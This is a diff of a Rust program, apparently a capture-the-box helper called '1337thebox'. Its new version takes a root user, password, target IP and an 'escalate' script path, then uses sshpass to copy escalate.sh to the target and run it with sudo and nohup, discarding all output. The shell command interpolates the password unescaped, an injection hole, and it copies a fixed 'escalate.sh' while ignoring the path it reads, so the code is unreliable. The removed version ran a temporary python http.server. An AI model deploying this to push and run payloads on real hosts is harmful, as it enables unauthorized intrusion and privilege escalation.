@@ -1,72 +1,55 @@
-use std::process::{Command, Stdio};
-use std::io::{BufRead, BufReader, self, Read};
-use std::{thread, env};
-use std::time::Duration;
-
+use std::process::Command;
+use std::env;
+use std::fs;
 
 fn main() {
     let args: Vec<String> = env::args().collect();
+    
+    if args.len() <= 4 {
+        panic!("\nFor this script, enter the root user, root pass, target ip, and file path to the escalate file (or other).\nExample: 1337thebox root qwerty123 10.10.132.177 /home/thebestuser/1337thebox/escalate.sh\n");
+    }
 
     let user = &args[1];
     let pass = &args[2];
-    let yourip = &args[3];
-    let otherip = &args[4];
-    println!("{},{},{},{}", user, pass, yourip, otherip);
+    let otherip = &args[3];
+    let file_path = &args[4];
+
+    println!("Script initializing...\n Target user is {}, {}'s password is {}, target IP is {}, and the path to the escalate file is {}.", user, user, pass, otherip, file_path);
     
-    pythonstart();
-    let pythonpid: i32 = pythonpidfind() as i32;
-    thread::sleep(Duration::from_secs(10));
-    pythonpidkill(pythonpid);
-
-}
-
-fn sshupload() {
-    
-}
-
-fn pythonpidkill(pid: i32) {
-    let output = Command::new("kill")
-        .args(&[&format!("{}", pid)])
-        .stdout(Stdio::piped())
-        .spawn()
-        .expect("Error in killing process")
-        .wait()
-        .expect("Failed to wait for kill command");
-}
-
-fn pythonpidfind() -> u32 {
-    // Run the ps auxf command, listing all processes running
-    let output = Command::new("ps")
-        .args(&["auxf"])
-        .stdout(Stdio::piped())
-        .spawn()
-        .expect("Failed to execute ps auxf");
-
-    let reader = BufReader::new(output.stdout.unwrap());
-    for line in reader.lines() {
-        let line = line.expect("Error reading line");
-        if line.contains("[p]ython3 -m http.server 55203") {
-            let parts: Vec<&str> = line.split_whitespace().collect();
-            if parts.len() > 1 {
-                let python_pid = parts[1].parse().expect("Failed to parse PID");
-                println!("The PID of the python process is {}", python_pid);
-                return python_pid;
+    match fs::read_to_string(file_path) {
+        Ok(escalateFileContents) => {
+            if escalateFileContents.trim().is_empty() {
+                println!("The file is empty or contains only whitespace.");
             } else {
-                panic!("PID not found");
+                
+                run_ssh_commands(user, pass, otherip, &escalateFileContents);
             }
+        },
+        Err(e) => {
+            println!("Failed to read the file: {}", e);
         }
     }
-    panic!("Python process not found");
 }
 
+fn run_ssh_commands(user: &str, pass: &str, otherip: &str, escalateFileContents: &str) {
+    if escalateFileContents.trim().is_empty() {
+        println!("The escalate file is empty or contains only whitespace.");
+        return;
+    }
 
-fn pythonstart() {
-    let port = "55203"; // specify the port
+    let ssh_command = format!("sshpass -p '{}' scp escalate.sh {}@{}:~/ && sshpass -p '{}' ssh {}@{} 'chmod +x ~/escalate.sh && nohup sudo ~/escalate.sh >/dev/null 2>&1 &'",
+                              pass, user, otherip, pass, user, otherip);
 
-    // Spawn the Python server process in the background
-    Command::new("python3")
-        .args(&["-m", "http.server", port])
-        .spawn()
-        .expect("Failed to start Python server");
-    println!("Python server started on port {}", port);
+    let output = Command::new("sh")
+        .arg("-c")
+        .arg(&ssh_command)
+        .output()
+        .expect("Failed to execute SSH command");
+
+    if output.status.success() {
+        println!("SSH command executed successfully!");
+    } else {
+        println!("SSH command failed to execute:");
+        println!("{}", String::from_utf8_lossy(&output.stderr));
+    }
 }
